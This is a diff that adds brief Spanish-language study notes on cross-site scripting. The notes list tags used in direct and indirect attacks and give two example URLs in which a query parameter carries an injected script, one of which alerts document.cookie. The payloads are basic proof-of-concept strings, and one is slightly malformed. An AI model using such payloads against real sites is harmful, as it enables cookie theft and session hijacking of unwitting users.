@@ -1,0 +1,37 @@
+
+	ATAQUE INDIRECTO
+meta
+<script>
+alert
+
+	ATAQUE DIRECTO
+ataque
+<meta
+<h1> //h2 h3 h4 h5
+<?php
+<!
+
+---------------------------------------------------------
+
+EJEMPLO 1:
+
+CONSULTA:
+http://www.yoursite.com/index.html?name=Alex
+
+
+CONSULTA XXS
+http://www.yoursite.com/index.html?name=<script>alert('XSS vulnerability')</script>
+
+---------------------------
+
+EJEMPLO 2:
+
+CONSULTA:
+http://www.some.site/page.html?default=French
+
+CONSULTA XXS
+http://www.some.site/page.html?default=<script>// <![CDATA[
+alert(document.cookie)
+// ]]<</script>
+
+
